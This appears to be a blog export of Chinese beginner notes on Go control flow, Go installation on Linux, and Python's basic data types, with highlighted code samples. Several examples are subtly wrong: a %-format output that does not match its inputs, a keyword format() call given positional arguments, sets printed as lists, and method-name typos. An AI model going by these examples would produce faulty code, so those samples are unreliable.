id="for-range">for range</h3><p><code>for range</code>类似于<code>for in</code>。在Go语言中，我们可以使用<code>for range</code>遍历数组、切片、字符串、map及通道（channel）</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> key, value := <span class="keyword">range</span> oldMap &#123; <span class="comment">//在数组中，key代表下标，value为对应的值</span></span><br><span class="line">    newMap[key] = value</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>以上代码中，key和value都是可以省略的</p><p>如果我们想只读取一个参数，我们可以有两种形式</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//第一种</span></span><br><span class="line"><span class="keyword">for</span> key := <span class="keyword">range</span> oldMap</span><br><span class="line"><span class="comment">//第二种</span></span><br><span class="line"><span class="keyword">for</span> _, value := <span class="keyword">range</span> oldMap</span><br></pre></td></tr></table></figure><h3 id="if">if</h3><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">sqrt</span><span class="params">(x <span class="type">float64</span>)</span></span> <span class="type">string</span> &#123;</span><br><span class="line"><span class="keyword">if</span> x &lt; <span class="number">0</span> &#123;</span><br><span class="line"><span class="keyword">return</span> sqrt(-x) + <span class="string">&quot;i&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> fmt.Sprint(math.Sqrt(x))</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//fmt.Sprint()的作用相当于是拼接字符串</span></span><br></pre></td></tr></table></figure><p>Go语言允许在条件表达式之前，执行一个语句</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">pow</span><span class="params">(x, n, lim <span class="type">float64</span>)</span></span> <span class="type">float64</span> &#123;</span><br><span class="line"><span class="keyword">if</span> v := math.Pow(x, n); v &lt; lim &#123;</span><br><span class="line"><span class="keyword">return</span> v</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> lim</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个<code>v</code>的作用域是在if这个代码块内的</p><p>else与else if的用法也很简单</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> a <span class="type">int</span></span><br><span class="line"><span class="keyword">if</span> _, _ = fmt.Scan(&amp;a); a &gt; <span class="number">10</span> &#123;</span><br><span class="line">fmt.Println(<span class="string">&quot;a &gt; 10&quot;</span>)</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> a == <span class="number">10</span> &#123;</span><br><span class="line">fmt.Println(<span class="string">&quot;a = 10&quot;</span>)</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">fmt.Println(<span class="string">&quot;a &lt; 10&quot;</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="switch">switch</h3><p>对比 C 的 <code>switch</code>，更新了以下几点：</p><ul><li><p><code>case</code> 现在不一定要是常量，也可以是表达式</p></li><li><p>每个分支都是默认 <code>break</code> 的，如果你不想跳出，可以以 <code>fallthrough</code> 语句结束</p></li><li><p>支持多条件匹配</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">switch</span> a &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>:</span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><p>举个完整的例子</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">&quot;fmt&quot;</span></span><br><span class="line"><span class="string">&quot;runtime&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">fmt.Print(<span class="string">&quot;Go run on &quot;</span>)</span><br><span class="line"><span class="keyword">switch</span> os := runtime.GOOS; os &#123;</span><br><span class="line"><span class="keyword">case</span> <span class="string">&quot;darwin&quot;</span>:</span><br><span class="line">fmt.Println(<span class="string">&quot;OS X&quot;</span>)</span><br><span class="line"><span class="keyword">case</span> <span class="string">&quot;linux&quot;</span>:</span><br><span class="line">fmt.Println(<span class="string">&quot;GNU/Linux&quot;</span>)</span><br><span class="line"><span class="keyword">default</span>:</span><br><span class="line">fmt.Printf(<span class="string">&quot;%s\n&quot;</span>, os)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://image.icewindy.cn/202301262157237.png" alt="image-20230126215725209"></p><h3 id="defer">defer</h3><p><code>defer</code> 语句会将函数推迟到外层函数返回之后执行</p><p>推迟调用的函数其参数会立即求值，但会被压入栈中，直到外层函数返回时才会按照后进先出的顺序出栈</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;fmt&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">fmt.Println(<span class="string">&quot;counting&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i := <span class="number">0</span>; i &lt; <span class="number">10</span>; i++ &#123;</span><br><span class="line"><span class="keyword">defer</span> fmt.Println(i)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">fmt.Println(<span class="string">&quot;done&quot;</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://image.icewindy.cn/202301262211498.png" alt="image-20230126221101474"></p>]]></content>
      
      
      <categories>
          
          <category> Golang </category>
          
          <category> 基础 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Golang </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>golang基础笔记（1）：环境配置</title>
      <link href="/2023/01/18/golang%E5%9F%BA%E7%A1%80%E7%AC%94%E8%AE%B0%EF%BC%881%EF%BC%89%EF%BC%9A%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/"/>
      <url>/2023/01/18/golang%E5%9F%BA%E7%A1%80%E7%AC%94%E8%AE%B0%EF%BC%881%EF%BC%89%EF%BC%9A%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/</url>
      
        <content type="html"><![CDATA[<h2 id="golang安装">Golang安装</h2><p>Go语言支持大部分常见系统与处理器架构：</p><ul><li>Linux</li><li>MacOS</li><li>Windows</li><li>…</li></ul><p>我们可以前往Golang的官方网站<a href="https://go.dev/dl/">下载</a>对应安装包或者二进制包</p><p><img src="https://image.icewindy.cn/202301181520285.png" alt="image-20230118152006239"></p><p>本文以Linux平台作为演示，类Unix使用二进制包安装的流程大致相同</p><p><img src="https://image.icewindy.cn/202301281449255.png" alt="image-20230128144902213"></p><p>步骤大致如下</p><ol><li><p>下载二进制包 go1.x.x.linux-amd64.tar.gz</p></li><li><p>进入保存的文件夹，将二进制包解压到/usr/local目录下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tar -C /usr/local -xzf go1.x.x.linux-amd64.tar.gz</span><br></pre></td></tr></table></figure></li><li><p>将/usr/local/go/bin目录添加到PATH环境变量下：</p><p>直接使用命令只能临时添加，因此我们选用编辑终端的配置文件，首先我们需要确定自己的终端配置文件是哪个</p><p>我是zsh终端，因此我们需要修改~/.zshrc，将命令添加到该文件末尾（最好做上注释）。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#golang</span></span><br><span class="line"><span class="built_in">export</span> PATH=<span class="variable">$PATH</span>:/usr/local/go/bin</span><br></pre></td></tr></table></figure></li><li><p>测试</p><p><img src="https://image.icewindy.cn/202301181541611.png" alt="image-20230118154146591"></p><p>安装完成！</p></li></ol>]]></content>
      
      
      <categories>
          
          <category> Golang </category>
          
          <category> 基础 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Golang </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Python基础笔记（3）：基本数据类型</title>
      <link href="/2023/01/09/Python%E5%9F%BA%E7%A1%80%E7%AC%94%E8%AE%B0%EF%BC%883%EF%BC%89%EF%BC%9A%E5%9F%BA%E6%9C%AC%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B/"/>
      <url>/2023/01/09/Python%E5%9F%BA%E7%A1%80%E7%AC%94%E8%AE%B0%EF%BC%883%EF%BC%89%EF%BC%9A%E5%9F%BA%E6%9C%AC%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B/</url>
      
        <content type="html"><![CDATA[<h2 id="标准数据类型">标准数据类型</h2><p>在上个笔记中，我们提及了Python中的六个标准的数据类型：</p><ul><li>Number（数字）</li><li>String（字符串）</li><li>List（列表）</li><li>Tuple（元组）</li><li>Set（集合）</li><li>Dictionary（字典）</li></ul><h2 id="number-数字">Number 数字</h2><p>Python3 支持 <strong>int、float、bool、complex（复数）</strong>。</p><p>在Python 3里，只有一种整数类型 int，表示为长整型，没有 python2 中的 Long。</p><p>在 <code>Python3.6+</code> 中书写很大的数时，可以在任意位置加入下划线，使数字更清晰易读，但是请注意Python3中的数字是<strong>没有限制大小的</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">universe_age= <span class="number">14_000_000_000</span></span><br></pre></td></tr></table></figure><p>bool 是 int 的子类，True 和 False 可以和数字相加， <code>True==1、False==0</code> 会返回<code>True</code>，但可以通过<code>is</code>来判断类型：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="number">1</span> <span class="keyword">is</span> <span class="literal">True</span></span><br><span class="line"><span class="literal">False</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="number">0</span> <span class="keyword">is</span> <span class="literal">False</span></span><br><span class="line"><span class="literal">False</span></span><br></pre></td></tr></table></figure><p>而其他三种则为三种不同的数值类型</p><h3 id="三种数">三种数</h3><ol><li><strong>整型( <code>int</code> )</strong> ： 通常被称为整型或整数</li><li><strong>浮点型( <code>float</code> )</strong> ： 浮点型由整数部分与小数部分组成，浮点型也可以使用科学计数法表示 <code>2.5e2</code></li><li><strong>复数( <code>complex</code> )</strong> ： 复数由实数部分和虚数部分构成，可以用 <code>a + bj</code>,或者 <code>complex(a,b)</code> 表示，<code>a</code> 和 <code>b</code> 都将以浮点型存储</li></ol><h3 id="互相转换">互相转换</h3><ul><li><strong><code>int(x)</code></strong> 将<code>x</code>转换为一个整数。</li><li><strong><code>float(x)</code></strong> 将<code>x</code>转换到一个浮点数。</li><li><strong><code>complex(x)</code></strong> 将<code>x</code>转换到一个复数，实数部分为 <code>x</code>，虚数部分为 <code>0</code></li><li><strong><code>complex(x, y)</code></strong> 将 <code>x</code> 和 <code>y</code> 转换到一个复数，实数部分为 <code>x</code>，虚数部分为 <code>y</code></li></ul><h3 id="数值运算">数值运算</h3><p>常见的有七种：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="number">5</span> + <span class="number">4</span>  <span class="comment"># 加法</span></span><br><span class="line"><span class="number">9</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="number">4.3</span> - <span class="number">2</span> <span class="comment"># 减法</span></span><br><span class="line"><span class="number">2.3</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="number">3</span> * <span class="number">7</span>  <span class="comment"># 乘法</span></span><br><span class="line"><span class="number">21</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="number">2</span> / <span class="number">4</span>  <span class="comment"># 除法，得到一个浮点数</span></span><br><span class="line"><span class="number">0.5</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="number">2</span> // <span class="number">4</span> <span class="comment"># 除法，得到一个整数</span></span><br><span class="line"><span class="number">0</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="number">17</span> % <span class="number">3</span> <span class="comment"># 取余</span></span><br><span class="line"><span class="number">2</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="number">2</span> ** <span class="number">5</span> <span class="comment"># 乘方</span></span><br><span class="line"><span class="number">32</span></span><br></pre></td></tr></table></figure><h3 id="二-八-十六进制">二、八、十六进制</h3><h4 id="表示法">表示法</h4><ul><li>二进制 ： <code>b</code>；<code>0b110011</code></li><li>八进制： <code>o</code>；<code>0o56432</code></li><li>十六进制： <code>x</code>；<code>0xF765A</code></li></ul><h4 id="互相转换">互相转换</h4><ul><li><strong><code>int(&quot;x&quot;, y)</code></strong> 将x转换为y进制</li><li><strong><code>bin(x)</code></strong> 将x转换为二进制</li><li><strong><code>hex(x)</code></strong> 将x转换为十六进制</li><li><strong><code>oct(x)</code></strong> 将x转换为八进制</li></ul><h2 id="string-字符串">String 字符串</h2><p>Python中的字符串用单引号<code>'</code>或双引号<code>&quot;</code>括起来，同时使用反斜杠<code>\</code>转义特殊字符。</p><h3 id="字符串截取">字符串截取</h3><p>字符串的截取的语法格式如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">变量[头下标:尾下标]</span><br></pre></td></tr></table></figure><p>下标值以 0 为开始值，-1 为从末尾的开始位置。</p><h3 id="字符转义">字符转义</h3><p>Python使用反斜杠<code>\</code>转义特殊字符</p><p>如果要使反斜杠不发生转义，则可以在字符串前加<code>r</code>，表示原始字符串：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">print</span>(<span class="string">&#x27;hello\nworld&#x27;</span>)</span><br><span class="line">hello</span><br><span class="line">world</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">print</span>(<span class="string">r&#x27;hello\nworld&#x27;</span>)</span><br><span class="line">hello\nworld</span><br><span class="line">&gt;&gt;&gt;</span><br></pre></td></tr></table></figure><h3 id="注意点">注意点</h3><ol><li>字符串可以用+运算符连接在一起，用*运算符重复</li><li>Python中的字符串不能改变，不能向一个索引位置赋值，例如<code>word[0] = 'm'</code>会导致错误</li></ol><h3 id="格式化字符串">格式化字符串</h3><h4 id="格式符"><code>%</code>格式符</h4><p>与大多数语言的<code>printf()</code>类似，但是他是以%后接的形式</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="string">&quot;今天是%d月%d日,天气%s&quot;</span> % (<span class="number">1</span>, <span class="number">10</span>, <span class="string">&quot;阴&quot;</span>)</span><br><span class="line"><span class="string">&#x27;今天是3月5日,天气阴&#x27;</span></span><br></pre></td></tr></table></figure><h4 id="format方法"><code>format</code>方法</h4><p>format方法有三种格式化方式</p><ul><li><p>按位置顺序填充</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">hw = <span class="string">&quot;hello &#123;&#125;&#123;&#125;&#123;&#125;&quot;</span></span><br><span class="line"><span class="built_in">print</span>(hw.<span class="built_in">format</span>(<span class="string">&quot;wo&quot;</span>,<span class="string">&quot;rl&quot;</span>,<span class="string">&quot;d!&quot;</span>))</span><br></pre></td></tr></table></figure></li><li><p>按索引值填充</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">hw = <span class="string">&quot;hello &#123;2&#125;&#123;0&#125;&#123;1&#125;&quot;</span></span><br><span class="line"><span class="built_in">print</span>(hw.<span class="built_in">format</span>(<span class="string">&quot;d!&quot;</span>,<span class="string">&quot;wo&quot;</span>,<span class="string">&quot;rl&quot;</span>))</span><br></pre></td></tr></table></figure></li><li><p>按照关键词填充</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">hw = <span class="string">&quot;hello &#123;a&#125;&#123;b&#125;&#123;c&#125;&quot;</span></span><br><span class="line"><span class="built_in">print</span>(hw.<span class="built_in">format</span>(<span class="string">&quot;wo&quot;</span>,<span class="string">&quot;rl&quot;</span>,<span class="string">&quot;d!&quot;</span>))</span><br></pre></td></tr></table></figure></li></ul><h4 id="f-string"><code>f-string</code></h4><p>f-string称之为字面量格式化字符串，类似于JS框架中的<code>&#123;&#123; var &#125;&#125;</code>。</p><p>它以<code>f</code>开头，后面跟着字符串，字符串中的表达式用大括号<code>&#123;&#125;</code>包起来，它会将变量或表达式计算后的值替换进去：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>name = <span class="string">&#x27;Runoob&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="string">f&#x27;Hello <span class="subst">&#123;name&#125;</span>&#x27;</span>  <span class="comment"># 替换变量</span></span><br><span class="line"><span class="string">&#x27;Hello Runoob&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="string">f&#x27;<span class="subst">&#123;<span class="number">1</span>+<span class="number">2</span>&#125;</span>&#x27;</span>         <span class="comment"># 使用表达式</span></span><br><span class="line"><span class="string">&#x27;3&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>w = &#123;<span class="string">&#x27;name&#x27;</span>: <span class="string">&#x27;Runoob&#x27;</span>, <span class="string">&#x27;url&#x27;</span>: <span class="string">&#x27;www.runoob.com&#x27;</span>&#125;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="string">f&#x27;<span class="subst">&#123;w[<span class="string">&quot;name&quot;</span>]&#125;</span>: <span class="subst">&#123;w[<span class="string">&quot;url&quot;</span>]&#125;</span>&#x27;</span></span><br><span class="line"><span class="string">&#x27;Runoob: www.runoob.com&#x27;</span></span><br></pre></td></tr></table></figure><h3 id="字符串运算">字符串运算</h3><p>下表实例变量 <code>a</code> 值为字符串 <code>&quot;Hello&quot;</code>，<code>b</code> 变量值为 <code>&quot;Python&quot;</code></p><table><thead><tr><th>操作符</th><th>描述</th><th>实例</th></tr></thead><tbody><tr><td><code>+</code></td><td>字符串连接</td><td><code>a + b</code> 输出结果： <code>HelloPython</code></td></tr><tr><td><code>*</code></td><td>重复输出字符串</td><td><code>a*2</code> 输出结果：<code>HelloHello</code></td></tr><tr><td><code>[]</code></td><td>通过索引获取字符串中字符</td><td><code>a[1]</code> 输出结果 <code>e</code></td></tr><tr><td><code>[ : ]</code></td><td>截取字符串</td><td><code>a[1:4]</code> 输出结果 <code>ell</code></td></tr><tr><td><code>in</code></td><td>成员运算符 - 如果字符串中包含给定的字符返回 <code>True</code></td><td><code>'H' in a</code> 输出结果 <code>True</code></td></tr><tr><td><code>not in</code></td><td>成员运算符 - 如果字符串中不包含给定的字符返回 <code>True</code></td><td><code>'M' not in a</code> 输出结果 <code>True</code></td></tr><tr><td><code>==</code>、<code>!=</code></td><td>两个字符串是否完全相等</td><td><code>a!=b</code> 输出结果 <code>True</code></td></tr><tr><td><code>&gt;</code>、<code>&lt;</code>、<code>&gt;=</code> 、<code>&lt;=</code></td><td>依次比较<code>ACSII码</code></td><td><code>a&lt;b</code> 输出结果 <code>True</code></td></tr></tbody></table><h2 id="list-列表">List 列表</h2><p>List（列表） 是 Python 中使用最频繁的数据类型。列表中元素的类型可以不相同，它支持数字，字符串甚至可以包含列表（所谓嵌套）。</p><p>列表中元素的类型可以不相同，它支持数字，字符串甚至可以包含列表（所谓嵌套）。</p><h3 id="创建列表">创建列表</h3><p>使用中括号 <code>[]</code> 将各个元素括起来即可，元素类型可不相同</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">list</span> = [<span class="string">&#x27;red&#x27;</span>, <span class="string">&#x27;green&#x27;</span>, <span class="string">&#x27;blue&#x27;</span>, <span class="string">&#x27;yellow&#x27;</span>, <span class="string">&#x27;white&#x27;</span>]</span><br><span class="line">diffList = [ <span class="string">&#x27;abc&#x27;</span>, <span class="number">123</span>, [<span class="string">&#x27;456&#x27;</span>]]</span><br></pre></td></tr></table></figure><h3 id="列表截取">列表截取</h3><p>-列表截取的语法格式如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">变量[头下标:尾下标]</span><br></pre></td></tr></table></figure><p>索引值以 <strong>0</strong> 为开始值，<strong>-1</strong> 为从末尾的开始位置，留空为直到最前或者最后一个元素。</p><h3 id="列表操作符">列表操作符</h3><ul><li><p>组合 <code>+</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">print</span>([<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>] + [<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>]) <span class="comment"># [1, 2, 3, 4, 5, 6]</span></span><br></pre></td></tr></table></figure></li><li><p>重复 ‘*’</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">print</span>([<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>] * <span class="number">2</span>) <span class="comment"># [1, 2, 3, 1, 2, 3]</span></span><br></pre></td></tr></table></figure></li><li><p>判断是否存在列表中 <code>in / not in</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">print</span> (<span class="number">3</span> <span class="keyword">in</span> [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>]) <span class="comment"># True</span></span><br><span class="line"><span class="built_in">print</span> (<span class="number">3</span> <span class="keyword">not</span> <span class="keyword">in</span> [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>]) <span class="comment"># False</span></span><br></pre></td></tr></table></figure></li></ul><h3 id="函数与方法">函数与方法</h3><h4 id="函数">函数</h4><ul><li><code>len(list)</code> 列表元素个数</li><li><code>max(list)</code> 返回列表元素最大值</li><li><code>min(list)</code> 返回列表元素最小值</li><li><code>list(seq)</code> 将元组转换为列表</li></ul><h4 id="方法">方法</h4><p><strong>增加</strong></p><ul><li><code>list.append(obj)</code> 在列表末尾添加新的对象</li><li><code>list.extend(seq)</code> 在列表末尾追加另一个序列中的多个值</li><li><code>list.insert(index, obj)</code> 将对象插入列表</li></ul><p><strong>删除</strong></p><ul><li><code>list.pop(index)</code> 移除列表中的一个元素，默认是最后一个，并返回值（栈的pop）</li><li><code>list.remove(obj)</code> 移除列表中该对象的第一个匹配值</li><li><code>list.clear()</code> 清空列表</li></ul><p><strong>查找</strong></p><ul><li><code>list.index(obj)</code> 查找该对象的第一个匹配值的索引位置</li></ul><p><strong>修改</strong></p><ul><li><code>list.reverse()</code> 反向列表中的元素</li><li><code>list.sort(key=Nome, reverse=False)</code> 对列表排序</li><li>直接根据索引修改</li></ul><p><strong>统计与复制</strong></p><ul><li><code>list.count(obj)</code> 统计对象出现的次数</li><li><code>list.copy()</code> 复制列表</li></ul><h2 id="tuple-元组">Tuple 元组</h2><p>元组与列表类似，区别在于元组的元素不能修改。</p><h3 id="创建元组">创建元组</h3><p>元组写在小括号 <strong>()</strong> 里，元素之间用逗号隔开</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">tuple</span> = (<span class="string">&#x27;abc&#x27;</span>, <span class="number">123</span>, (<span class="number">456</span>,))</span><br></pre></td></tr></table></figure><p>元组与字符串类似，可以被索引且下标索引从0开始，-1 为从末尾开始的位置。也可以进行截取。</p><p>虽然tuple的元素不可改变，但它可以包含可变的对象，比如list列表。</p><h3 id="注意点">注意点</h3><ul><li><p>string、list 和 tuple 都属于 sequence（序列）</p></li><li><p>构造包含只有一个元素的元组需要在后面添加逗号</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tup = (<span class="number">123</span>,)</span><br></pre></td></tr></table></figure></li><li><p>元组也可以使用+操作符进行拼接</p></li></ul><h2 id="set-集合">Set 集合</h2><p>Python中的集合与数学概念的集合类似，集合中的每一个元素都是独一无二的，是一个<strong>无序不重复</strong>元素的序列；</p><p>由于集合是无序的，因此它不会以特定的顺序储存元素，遍历里面的元素所提取出来的元素的顺序也是不定的。</p><h3 id="创建集合">创建集合</h3><p>创建集合有两种方法</p><ul><li><p>使用大括号 <code>&#123;&#125;</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">set</span> = &#123;var1, var2, ...&#125;</span><br></pre></td></tr></table></figure></li><li><p>使用 <code>set()</code>函数</p><p>该函数可以将其他类型转换为集合或者创建一个空集合。由于<code>&#123; &#125;</code>是用于创建一个空的字典的，所以空集合只能通过set()来创建</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">a = <span class="built_in">set</span>(<span class="string">&quot;12345&quot;</span>) <span class="comment"># 字符串转集合</span></span><br><span class="line">b = <span class="built_in">set</span>([<span class="string">&#x27;4&#x27;</span>, <span class="string">&#x27;5&#x27;</span>, <span class="string">&#x27;6&#x27;</span>, <span class="string">&#x27;7&#x27;</span>, <span class="string">&#x27;8&#x27;</span>]) <span class="comment"># 列表转集合</span></span><br><span class="line"><span class="built_in">print</span>(a) <span class="comment"># [&#x27;1&#x27;, &#x27;2&#x27;, &#x27;3&#x27;, &#x27;4&#x27;, &#x27;5&#x27;]</span></span><br><span class="line"><span class="built_in">print</span>(b) <span class="comment"># [&#x27;4&#x27;, &#x27;5&#x27;, &#x27;6&#x27;, &#x27;7&#x27;, &#x27;8&#x27;]</span></span><br></pre></td></tr></table></figure></li></ul><h3 id="集合运算">集合运算</h3><p>集合的运算与数学中的运算类似</p><p><img src="https://image.icewindy.cn/202301111518317.png" alt="img"></p><p>在python中提供了多种运算符与方法进行集合的运算</p><table><thead><tr><th>运算符 / 方法</th><th>描述</th></tr></thead><tbody><tr><td><code>S &amp; T</code> 或 <code>S.intersaction(T)</code></td><td><strong>交集</strong>。返回一个新集合,包括同时在集合 S 和 T 中的元素</td></tr><tr><td><code>S | T</code> 或 <code>S.union(T)</code></td><td><strong>并集</strong>。返回一个新集合,包括集合 S 和 T 中的所有元素</td></tr><tr><td><code>S - T</code> 或 <code>S.difference(T)</code></td><td><strong>差集</strong>。返回一个新集合,包括在集合 S 中但不在集合 T 中的元素</td></tr><tr><td><code>S ^ T</code>或 <code>s.symmetric_difference(T)</code></td><td>补集。返回一个新集合,包括集合 S 和 T 中的元素,但不包括同时在其中的元素</td></tr><tr><td><code>s &lt;= T</code> 或 